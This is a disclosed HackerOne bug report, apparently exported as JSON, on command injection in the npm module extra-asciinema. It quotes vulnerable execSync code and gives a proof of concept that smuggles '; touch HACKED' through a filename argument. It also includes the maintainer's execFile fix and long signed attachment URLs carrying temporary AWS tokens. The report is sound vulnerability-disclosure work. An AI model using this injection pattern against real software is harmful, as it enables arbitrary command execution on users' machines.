{"id":863956,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NjM5NTY=","url":"https://hackerone.com/reports/863956","title":"[extra-asciinema] Command Injection via insecure command formatting","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-05-01T11:39:52.991Z","submitted_at":"2020-05-01T11:39:52.991Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"d3lla","url":"/d3lla","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-08-22T08:48:20.138Z","bug_reporter_agreed_on_going_public_at":"2020-08-22T08:48:20.101Z","team_member_agreed_on_going_public_at":"2020-08-21T20:51:48.193Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report a `Command Injection` issue in the `extra-asciinema` module.\nIt allows to execute arbitrary commands on the victim's PC.\n\n# Module\n\n**module name:** `extra-asciinema`\n**version:** `1.0.5`\n**npm page:** `https://www.npmjs.com/package/extra-asciinema`\n\n## Module Description\n\nasciinema is a terminal screen recorder.\n\nWith this package you can auto-generate terminal recordings for Node.js examples through asciinema programmatically. Each method is also available as separate package for use by bundling tools, like browserify, rollup, uglify-js.\n\n## Module Stats\n\n[23] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe issue occurs because a user input parameter is used inside a command that is executed without any check. \n\nI tested the `uploadSync` function.\nHere's the code which causes the issue:\n\n```javascript\n// https://github.com/nodef/extra-asciinema/blob/master/index.js#L214\n...\nconst cp9 = require('child_process');\n...\n/**\n * Upload recorded asciicast to asciinema.org site.\n * @param {string} f filename\n * @returns {string} asciicast URL\n */\nfunction uploadSync(f) {\n  var stdout = cp9.execSync(`asciinema upload ${f}`, {encoding: 'utf8'});\n  return stdout.replace(/.*?(https?:\\S+).*/s, '$1');\n}\n...\n```\nThe `f` parameter is used to build the command that is passed to the `child_process.execSync` function without any check.\n\n\n## Steps To Reproduce:\n- create a directory for testing\n    - `mkdir poc`\n    - `cd poc/`\n\n- install `extra-asciinema` module:\n    -  `npm i extra-asciinema`\n- create the following PoC JavaScript file (`poc.js`):\n\n```javascript\nconst asciinema = require('extra-asciinema');\nasciinema.uploadSync('; touch HACKED');\n\n```\n- make sure that the `HACKED` file does not exist:\n    - `ls`\n- execute the `poc.js` file:\n    - `node poc.js`\n- the `HACKED` file is created:\n    - `ls`\n    \n{F810853}\n\n\n## Patch\nDo not concatenate/format commands using insecure user's input. Always check and sanitize it. \nIn my opinion, it's better to use [`child_process.execFileSync`](https://nodejs.org/api/child_process.html#child_process_child_process_execfilesync_file_args_options) or [`child_process.spawnSync`](https://nodejs.org/api/child_process.html#child_process_child_process_spawnsync_command_args_options) functions instead of `child_process.execSync`.\n\n## Supporting Material/References:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v13.13.0\n- NPM VERSION: 6.14.4\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nCommand Injection on `extra-asciinema` module via insecure command formatting.","vulnerability_information_html":"\u003cp\u003eI would like to report a \u003ccode\u003eCommand Injection\u003c/code\u003e issue in the \u003ccode\u003eextra-asciinema\u003c/code\u003e module.\u003cbr\u003e\nIt allows to execute arbitrary commands on the victim\u0026#39;s PC.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e \u003ccode\u003eextra-asciinema\u003c/code\u003e\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e \u003ccode\u003e1.0.5\u003c/code\u003e\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/extra-asciinema\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cp\u003easciinema is a terminal screen recorder.\u003c/p\u003e\n\n\u003cp\u003eWith this package you can auto-generate terminal recordings for Node.js examples through asciinema programmatically. Each method is also available as separate package for use by bundling tools, like browserify, rollup, uglify-js.\u003c/p\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e[23] weekly downloads\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eThe issue occurs because a user input parameter is used inside a command that is executed without any check. \u003c/p\u003e\n\n\u003cp\u003eI tested the \u003ccode\u003euploadSync\u003c/code\u003e function.\u003cbr\u003e\nHere\u0026#39;s the code which causes the issue:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e// https://github.com/nodef/extra-asciinema/blob/master/index.js#L214\u003c/span\u003e\n\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003ecp9\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003echild_process\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003cspan class=\"cm\"\u003e/**\n * Upload recorded asciicast to asciinema.org site.\n * @param {string} f filename\n * @returns {string} asciicast URL\n */\u003c/span\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003euploadSync\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003estdout\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ecp9\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eexecSync\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e`asciinema upload \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e`\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"na\"\u003eencoding\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eutf8\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003estdout\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/.*\u003c/span\u003e\u003cspan class=\"se\"\u003e?(\u003c/span\u003e\u003cspan class=\"sr\"\u003ehttps\u003c/span\u003e\u003cspan class=\"se\"\u003e?\u003c/span\u003e\u003cspan class=\"sr\"\u003e:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\S\u003c/span\u003e\u003cspan class=\"sr\"\u003e+\u003c/span\u003e\u003cspan class=\"se\"\u003e)\u003c/span\u003e\u003cspan class=\"sr\"\u003e.*/\u003c/span\u003e\u003cspan class=\"nx\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e$1\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003ef\u003c/code\u003e parameter is used to build the command that is passed to the \u003ccode\u003echild_process.execSync\u003c/code\u003e function without any check.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003ecreate a directory for testing\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003emkdir poc\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ecd poc/\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003einstall \u003ccode\u003eextra-asciinema\u003c/code\u003e module:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e \u003ccode\u003enpm i extra-asciinema\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003ecreate the following PoC JavaScript file (\u003ccode\u003epoc.js\u003c/code\u003e):\u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003easciinema\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eextra-asciinema\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003easciinema\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003euploadSync\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e; touch HACKED\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003emake sure that the \u003ccode\u003eHACKED\u003c/code\u003e file does not exist:\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003els\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eexecute the \u003ccode\u003epoc.js\u003c/code\u003e file:\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003enode poc.js\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003ethe \u003ccode\u003eHACKED\u003c/code\u003e file is created:\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003els\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"poc_extra-asciinema.mov\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9dLdPLeEf1vtLDxueNssKeNH?response-content-disposition=attachment%3B%20filename%3D%22poc_extra-asciinema.mov%22%3B%20filename%2A%3DUTF-8%27%27poc_extra-asciinema.mov\u0026amp;response-content-type=video%2Fquicktime\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ7KWAVKN2%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070256Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD1%2F98g6jqKF1gdjZ5ZeoLWwnKZTa7SodLIyHk4VOcB%2FAIgFI%2BEqMwMQ%2FjD3C0sLxiv4nCy8OqyFoWIlBFI%2B7p340cqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDLOK9Idi7%2FUoNMuAPiqRA4am%2B6RTpiKhn1AwsjrB6XVphwW3DOpYDdxbLb1mT2RMVWnv7voT3st7PIVsZlzggyCnKW3IXFl%2FFthkC8hPlanzQkmqsI8gI9NrFIkXHcsU6zuBZqsO8kJpBRkDZV6sMJHVSi8%2BbCx0ndEqAxWtiQNEX9ZxsGY3oYwlNJuSJRCRTxAEZa%2F71VqYA4l%2FEDtta2G98a%2B7w0m5jApr8Q303FIRKKxa0v1BRrgwOLkTtlrwYHfTvtXbfeFgqn7%2BHoWj7PaL4nijFBwOZy5CamnMUxGIKtp%2BYcDtI6MF7AU96g8HTcws4xmsFvEX1PpFoqJ6pPB25animcHJSKOaWfi13jxruCpA2sEjEa5wYBPiAEjXsNuSMRG13lbKep614wfDsTpEclccjKRS1nvV9SdDrQ9sc3ShrBOma9kxdr7f7NlgtPwXtxsIJFAeGww%2FEf8UO6hWNOWOyrbxMbAnaAqqrnrRbk1jWalvw%2FjtPzY1MyJZOgqN%2FDhCJzNx7WK5g2KXirutlO9xT8Th8Kxo1yn2i5YtMJinq%2F8FOusBforza3WyzCtzDkxPUVgf%2FxQ15NxR1ETwaKHsZvjxMX9aYpJLOFGo%2BMGtzI5L2fk7Kf5VV8NN8613OzcsiaUpShf%2FlTw0vgtzwFLStO18BMV5XTjpPteD7Y5jDvGQOX9eT%2FO7RiQI5pl5HrSk8ro%2FZocyZggI%2Fl8T3c4A1Ck7lnCXaoa2vMcxhQ5BYEAWGLxnxh9xU%2F%2F6s8roQqOd3GXc1FXIo6%2FfoiCNFrI5ijLtwHbhYPva2%2Bzao%2BuwW%2B%2BdoXpmOtSl4DL0dAHzV7zPwTy%2FzZj9GjkQF3WslKg%2BmtzbBXB%2FBa5ccvA7dWjRnw%3D%3D\u0026amp;X-Amz-Signature=215d02f70ea895ede040071353b87b082b391c6d8e7fbe8684974ceb7bef1c04\" data-attachment-type=\"video/quicktime\"\u003e\u003cvideo controls=\"controls\" src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9dLdPLeEf1vtLDxueNssKeNH?response-content-disposition=attachment%3B%20filename%3D%22poc_extra-asciinema.mov%22%3B%20filename%2A%3DUTF-8%27%27poc_extra-asciinema.mov\u0026amp;response-content-type=video%2Fquicktime\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ7KWAVKN2%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070256Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD1%2F98g6jqKF1gdjZ5ZeoLWwnKZTa7SodLIyHk4VOcB%2FAIgFI%2BEqMwMQ%2FjD3C0sLxiv4nCy8OqyFoWIlBFI%2B7p340cqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDLOK9Idi7%2FUoNMuAPiqRA4am%2B6RTpiKhn1AwsjrB6XVphwW3DOpYDdxbLb1mT2RMVWnv7voT3st7PIVsZlzggyCnKW3IXFl%2FFthkC8hPlanzQkmqsI8gI9NrFIkXHcsU6zuBZqsO8kJpBRkDZV6sMJHVSi8%2BbCx0ndEqAxWtiQNEX9ZxsGY3oYwlNJuSJRCRTxAEZa%2F71VqYA4l%2FEDtta2G98a%2B7w0m5jApr8Q303FIRKKxa0v1BRrgwOLkTtlrwYHfTvtXbfeFgqn7%2BHoWj7PaL4nijFBwOZy5CamnMUxGIKtp%2BYcDtI6MF7AU96g8HTcws4xmsFvEX1PpFoqJ6pPB25animcHJSKOaWfi13jxruCpA2sEjEa5wYBPiAEjXsNuSMRG13lbKep614wfDsTpEclccjKRS1nvV9SdDrQ9sc3ShrBOma9kxdr7f7NlgtPwXtxsIJFAeGww%2FEf8UO6hWNOWOyrbxMbAnaAqqrnrRbk1jWalvw%2FjtPzY1MyJZOgqN%2FDhCJzNx7WK5g2KXirutlO9xT8Th8Kxo1yn2i5YtMJinq%2F8FOusBforza3WyzCtzDkxPUVgf%2FxQ15NxR1ETwaKHsZvjxMX9aYpJLOFGo%2BMGtzI5L2fk7Kf5VV8NN8613OzcsiaUpShf%2FlTw0vgtzwFLStO18BMV5XTjpPteD7Y5jDvGQOX9eT%2FO7RiQI5pl5HrSk8ro%2FZocyZggI%2Fl8T3c4A1Ck7lnCXaoa2vMcxhQ5BYEAWGLxnxh9xU%2F%2F6s8roQqOd3GXc1FXIo6%2FfoiCNFrI5ijLtwHbhYPva2%2Bzao%2BuwW%2B%2BdoXpmOtSl4DL0dAHzV7zPwTy%2FzZj9GjkQF3WslKg%2BmtzbBXB%2FBa5ccvA7dWjRnw%3D%3D\u0026amp;X-Amz-Signature=215d02f70ea895ede040071353b87b082b391c6d8e7fbe8684974ceb7bef1c04\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/video\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003cp\u003eDo not concatenate/format commands using insecure user\u0026#39;s input. Always check and sanitize it. \u003cbr\u003e\nIn my opinion, it\u0026#39;s better to use \u003ca href=\"/redirect?url=https%3A%2F%2Fnodejs.org%2Fapi%2Fchild_process.html%23child_process_child_process_execfilesync_file_args_options\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e\u003ccode\u003echild_process.execFileSync\u003c/code\u003e\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e or \u003ca href=\"/redirect?url=https%3A%2F%2Fnodejs.org%2Fapi%2Fchild_process.html%23child_process_child_process_spawnsync_command_args_options\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e\u003ccode\u003echild_process.spawnSync\u003c/code\u003e\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e functions instead of \u003ccode\u003echild_process.execSync\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\u003c/li\u003e\n\u003cli\u003eNODEJS VERSION: v13.13.0\u003c/li\u003e\n\u003cli\u003eNPM VERSION: 6.14.4\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: [N] \u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: [N] \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThank you for your time.\u003c/p\u003e\n\n\u003cp\u003ebest regards,\u003c/p\u003e\n\n\u003cp\u003ed3lla\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eCommand Injection on \u003ccode\u003eextra-asciinema\u003c/code\u003e module via insecure command formatting.\u003c/p\u003e\n","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":810853,"file_name":"poc_extra-asciinema.mov","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9dLdPLeEf1vtLDxueNssKeNH?response-content-disposition=attachment%3B%20filename%3D%22poc_extra-asciinema.mov%22%3B%20filename%2A%3DUTF-8%27%27poc_extra-asciinema.mov\u0026response-content-type=video%2Fquicktime\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7KWAVKN2%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070256Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD1%2F98g6jqKF1gdjZ5ZeoLWwnKZTa7SodLIyHk4VOcB%2FAIgFI%2BEqMwMQ%2FjD3C0sLxiv4nCy8OqyFoWIlBFI%2B7p340cqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDLOK9Idi7%2FUoNMuAPiqRA4am%2B6RTpiKhn1AwsjrB6XVphwW3DOpYDdxbLb1mT2RMVWnv7voT3st7PIVsZlzggyCnKW3IXFl%2FFthkC8hPlanzQkmqsI8gI9NrFIkXHcsU6zuBZqsO8kJpBRkDZV6sMJHVSi8%2BbCx0ndEqAxWtiQNEX9ZxsGY3oYwlNJuSJRCRTxAEZa%2F71VqYA4l%2FEDtta2G98a%2B7w0m5jApr8Q303FIRKKxa0v1BRrgwOLkTtlrwYHfTvtXbfeFgqn7%2BHoWj7PaL4nijFBwOZy5CamnMUxGIKtp%2BYcDtI6MF7AU96g8HTcws4xmsFvEX1PpFoqJ6pPB25animcHJSKOaWfi13jxruCpA2sEjEa5wYBPiAEjXsNuSMRG13lbKep614wfDsTpEclccjKRS1nvV9SdDrQ9sc3ShrBOma9kxdr7f7NlgtPwXtxsIJFAeGww%2FEf8UO6hWNOWOyrbxMbAnaAqqrnrRbk1jWalvw%2FjtPzY1MyJZOgqN%2FDhCJzNx7WK5g2KXirutlO9xT8Th8Kxo1yn2i5YtMJinq%2F8FOusBforza3WyzCtzDkxPUVgf%2FxQ15NxR1ETwaKHsZvjxMX9aYpJLOFGo%2BMGtzI5L2fk7Kf5VV8NN8613OzcsiaUpShf%2FlTw0vgtzwFLStO18BMV5XTjpPteD7Y5jDvGQOX9eT%2FO7RiQI5pl5HrSk8ro%2FZocyZggI%2Fl8T3c4A1Ck7lnCXaoa2vMcxhQ5BYEAWGLxnxh9xU%2F%2F6s8roQqOd3GXc1FXIo6%2FfoiCNFrI5ijLtwHbhYPva2%2Bzao%2BuwW%2B%2BdoXpmOtSl4DL0dAHzV7zPwTy%2FzZj9GjkQF3WslKg%2BmtzbBXB%2FBa5ccvA7dWjRnw%3D%3D\u0026X-Amz-Signature=215d02f70ea895ede040071353b87b082b391c6d8e7fbe8684974ceb7bef1c04","file_size":818622,"type":"video/quicktime"}],"allow_singular_disclosure_at":"2020-09-20T20:51:48.272Z","allow_singular_disclosure_after":-8590268.044590985,"singular_disclosure_allowed":true,"vote_count":0,"voters":[],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":2986,"asset_type":"SOURCE_CODE","asset_identifier":"Other module","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7864311,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @d3lla,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@celt","markdown_message":"\u003cp\u003eHi \u003ca href=\"/d3lla\"\u003e@d3lla\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/celt\"\u003e@celt\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-01T14:13:45.081Z","updated_at":"2020-05-01T14:13:45.081Z","actor":{"username":"celt","cleared":false,"url":"/celt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CbJ76SLbXk5Eh7qbt9ejXyQB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7864345,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @d3lla,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@celt","markdown_message":"\u003cp\u003eHello \u003ca href=\"/d3lla\"\u003e@d3lla\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\n\u003ca href=\"/celt\"\u003e@celt\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-01T14:16:56.796Z","updated_at":"2020-05-01T14:16:56.796Z","actor":{"username":"celt","cleared":false,"url":"/celt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CbJ76SLbXk5Eh7qbt9ejXyQB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8736582,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-24T08:07:23.691Z","updated_at":"2020-07-24T08:07:23.691Z","actor":{"username":"wolfram77","cleared":false,"url":"/wolfram77","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8738322,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Used `execFile` for this one too. No more `HACKED` file.\n\nhttps://github.com/nodef/extra-asciinema/commit/fd1a8a38d6c72e1eb573b2ab03d5e86de8047480\n\n```bash\n\u003e var asciinema = require('./')\nundefined\n\u003e asciinema.uploadSync('; touch HACKED');\nasciinema: upload failed: [Errno 2] No such file or directory: '; touch HACKED'\nUncaught Error: Command failed: asciinema upload ; touch HACKED\nasciinema: upload failed: [Errno 2] No such file or directory: '; touch HACKED'\n\n    at checkExecSyncError (child_process.js:616:11)\n    at Object.execFileSync (child_process.js:634:15)\n    at Object.uploadSync (/home/wolfram/Documents/extra-asciinema/index.js:142:21) {\n  status: 1,\n  signal: null,\n  output: [\n    null,\n    '',\n    \"\\x1B[0;31masciinema: upload failed: [Errno 2] No such file or directory: '; touch HACKED'\\x1B[0m\\n\"\n  ],\n  pid: 68455,\n  stdout: '',\n  stderr: \"\\x1B[0;31masciinema: upload failed: [Errno 2] No such file or directory: '; touch HACKED'\\x1B[0m\\n\"\n}\n```","markdown_message":"\u003cp\u003eUsed \u003ccode\u003eexecFile\u003c/code\u003e for this one too. No more \u003ccode\u003eHACKED\u003c/code\u003e file.\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/nodef/extra-asciinema/commit/fd1a8a38d6c72e1eb573b2ab03d5e86de8047480\" 